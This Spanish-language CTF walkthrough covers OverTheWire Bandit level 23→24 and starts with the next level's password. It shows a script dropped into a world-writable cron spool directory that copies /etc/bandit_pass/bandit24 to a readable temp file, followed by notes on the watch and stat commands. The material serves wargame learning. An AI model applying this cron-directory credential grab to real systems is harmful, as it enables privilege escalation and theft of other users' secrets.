Pass next level  : gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8

Para este ejercicio tenemos una tarea cron que se ejecuta cada minuto y lo que realiza es que ejecuta todos los ejecutables dentro de un directorio especifico y los borra una vez terminado pero esta carpeta tine mal configurado los permisos por lo que nos perite escribir pero no leer en esta carpeta

```
bandit23@bandit:/tmp/tmp.Yqk92vbJ6X$ ls -ld /var/spool/bandit24/foo
drwxrwx-wx 17 root bandit24 4096 Dec 10 15:02 /var/spool/bandit24/foo
```

Cual es la idea, introducir un script aqui que nos cree un fichero con la password del usuario ya que la tarea se ejecuta con los permisos de este 
Nos creamos una carpeta temporal y ahi cremos nuestro script y le indicamos que nos envie la pass a esta carpeta temporal que nos cramos.
```
dir_name=$(mktemp -d)    #Guardamos en variabel para poder acceder facil
dir_file="/var/spool/bandit24/foo/" #Ruta donde se ejecutan los scripts

nano sploit.sh 
#!/bin/bash
#Obtenemos la pass del user 
cat /etc/bandit_pass/bandit24 > /tmp/tmp.Yqk92vbJ6X/pass.log 

#Le damos permiso en la carpeta temporal al archivo que se crea 
chmod o+rwx /tmp/tmp.Yqk92vbJ6X/pass.log

chmod +x sploit.sh

cp sploit.sh $dir_file

#Monitoreamos para ver cuado se ejecuta 

watch -n 1 ls -l

Ej Interesante comando watch

❯ watch -t date                                       
❯ watch -n2 -t date                                    
❯ watch -n 1 "ps aux | grep nginx"                     
❯ watch -n 1 -t "ps aux | grep nginx"                  
❯ watch -n 3 -t "ps aux | grep nginx"                  
❯ watch -n 2 date
```

El comando stat nos da información del archivo o carpeta que le indiquemos 
```
stat MyCarpeta

stat --format "%U" id_rsa   #Extraemos el propietario
```

Recorer con un for todos los archivos de un directorio 
```
for i in * .*;do if [ "$i" != "." -a "$i" != ".." ];then echo "Handling $i"; fi; done
```

```
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done
```